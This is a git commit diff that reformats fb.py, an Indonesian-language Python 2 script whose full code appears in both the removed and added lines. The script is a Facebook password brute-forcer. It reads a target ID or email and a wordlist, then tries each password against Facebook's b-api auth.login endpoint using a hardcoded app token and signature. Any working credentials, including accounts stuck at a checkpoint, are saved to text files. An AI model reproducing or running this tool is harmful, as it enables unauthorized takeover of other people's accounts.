4ef3145b249b8e7e19312166dc87c12dae0d5056
lorex-24 <159634260+lorex-24@users.noreply.github.com>
2024-06-11 15:55:48 +0800

    Update fb.py

--- fb.py
+++ fb.py
@@ -1,5 +1,12 @@
-import os, sys, time, datetime, random, json
+import os
+import sys
+import time
+import datetime
+import random
+import json
+import requests
 from multiprocessing.pool import ThreadPool
+
 try:
     import mechanize
 except ImportError:
@@ -12,8 +19,10 @@ else:
 
 from requests.exceptions import ConnectionError
 from mechanize import Browser
+
 reload(sys)
 sys.setdefaultencoding('utf8')
+
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
@@ -25,7 +34,7 @@ banner = '\n\033[31;1m____ ____ ____ ____ ___  ____ ____ _  _\n|___ |__| |    |_
 
 def ceknet():
     try:
-    	os.system('reset')
+        os.system('reset')
         print internet
         print '\r\033[37;1m[\x1b[92m+\033[37;1m] \033[37;1mMeriksa Koneksi Internet'
         time.sleep(2)
@@ -52,60 +61,61 @@ def ceknet():
             sys.exit()
 
     except KeyboardInterrupt:
-    	time.sleep(3.5)
+        time.sleep(3.5)
         exit('\n\033[37;1m[\x1b[92mx\033[37;1m] \033[31;1mProgram berhenti\n')
 
-def start():
-        try:
-            os.system('reset')
-            print banner
-            email = raw_input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m ID \033[36;1m| \033[37;1mEmail\033[36;1m | \033[37;1mHP \033[31;1m: \033[32;1m')
-            passw = raw_input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m File Wordlist   \033[31;1m:\033[32;1m ')
-            total = open(passw, 'r')
-            total = total.readlines()
-            print '\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTarget\033[36;1m :\033[32;1m ' + email
-            time.sleep(3.0)
-            print '\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTotal List \033[36;1m:\033[32;1m ' + str(len(total))
-            time.sleep(3.0)
-            print
-            sandi = open(passw, 'r')
-            for pw in sandi:
-                try:
-                    pw = pw.replace('\n', '')
-                    sys.stdout.write('\r\033[32;1m[\033[37;1m=\033[32;1m]\033[34;1m Start \033[37;1m>\033[35;1m '+email+'\033[37;1m >\033[35;1m '+pw)
-                    sys.stdout.flush()
-                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                    mpsh = json.loads(data.text)
-                    if 'access_token' in mpsh:
-                        dapat = open('succes.txt', 'w')
-                        dapat.write('[ID]=> ' + email + '\n')
-                        dapat.write('[PW]=> ' + pw)
-                        dapat.close()
-                        print '\n\n\033[32;1m[+] \033[37;1mPASSWORD FOUND'
-                        print '\033[32;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m'+email
-                        print '\033[32;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw
-                        print '\033[32;1m[+] \033[37;1mStatus   \033[32;1m:\033[32;1m SUCCES'
-                        print '\033[32;1m[=] \033[37;1mProgram Finish'
-                        sys.exit()
-                    else:
-                        if 'www.facebook.com' in mpsh['error_msg']:
-                            ceks = open('succesCP.txt', 'w')
-                            ceks.write('[ID]=> ' + email + '\n')
-                            ceks.write('[PW]=> ' + pw)
-                            ceks.close()
-                            print '\n\n\033[33;1m[+] \033[37;1mPASSWORD FOUND'
-                            print '\033[33;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m'+email
-                            print '\033[33;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw
-                            print '\033[33;1m[+] \033[37;1mStatus   \033[32;1m:\033[33;1m CHEKPOINT'
-                            print '\033[33;1m[=] \033[37;1mProgram Finish'
-                            sys.exit()
-                except requests.exceptions.ConnectionError:
-                    print '\033[37;1m[\033[32;1mx\033[37;1m] \033[31;1mkoneksi error'
-                    sys.exit()
 
-        except IOError:
-            print '\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mAlamat wordlist tidak ada'
-            print '\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mSaya sarankan Untuk Membuatnya sendiri'
-            sys.exit()
+def start():
+    try:
+        os.system('reset')
+        print banner
+        email = raw_input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m ID \033[36;1m| \033[37;1mEmail\033[36;1m | \033[37;1mHP \033[31;1m: \033[32;1m')
+        passw = raw_input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m File Wordlist   \033[31;1m:\033[32;1m ')
+        total = open(passw, 'r')
+        total = total.readlines()
+        print '\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTarget\033[36;1m :\033[32;1m ' + email
+        time.sleep(3.0)
+        print '\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTotal List \033[36;1m:\033[32;1m ' + str(len(total))
+        time.sleep(3.0)
+        print
+        sandi = open(passw, 'r')
+        for pw in sandi:
+            try:
+                pw = pw.replace('\n', '')
+                sys.stdout.write('\r\033[32;1m[\033[37;1m=\033[32;1m]\033[34;1m Start \033[37;1m>\033[35;1m '+email+'\033[37;1m >\033[35;1m '+pw)
+                sys.stdout.flush()
+                data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                mpsh = json.loads(data.text)
+                if 'access_token' in mpsh:
+                    dapat = open('succes.txt', 'w')
+                    dapat.write('[ID]=> ' + email + '\n')
+                    dapat.write('[PW]=> ' + pw)
+                    dapat.close()
+                    print '\n\n\033[32;1m[+] \033[37;1mPASSWORD FOUND'
+                    print '\033[32;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m'+email
+                    print '\033[32;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw
+                    print '\033[32;1m[+] \033[37;1mStatus   \033[32;1m:\033[32;1m SUCCES'
+                    print '\033[32;1m[=] \033[37;1mProgram Finish'
+                    sys.exit()
+                else:
+                    if 'www.facebook.com' in mpsh['error_msg']:
+                        ceks = open('succesCP.txt', 'w')
+                        ceks.write('[ID]=> ' + email + '\n')
+                        ceks.write('[PW]=> ' + pw)
+                        ceks.close()
+                        print '\n\n\033[33;1m[+] \033[37;1mPASSWORD FOUND'
+                        print '\033[33;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m'+email
+                        print '\033[33;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw
+                        print '\033[33;1m[+] \033[37;1mStatus   \033[32;1m:\033[33;1m CHEKPOINT'
+                        print '\033[33;1m[=] \033[37;1mProgram Finish'
+                        sys.exit()
+            except requests.exceptions.ConnectionError:
+                print '\033[37;1m[\033[32;1mx\033[37;1m] \033[31;1mkoneksi error'
+                sys.exit()
+
+    except IOError:
+        print '\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mAlamat wordlist tidak ada'
+        print '\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mSaya sarankan Untuk Membuatnya sendiri'
+        sys.exit()
 
 ceknet()
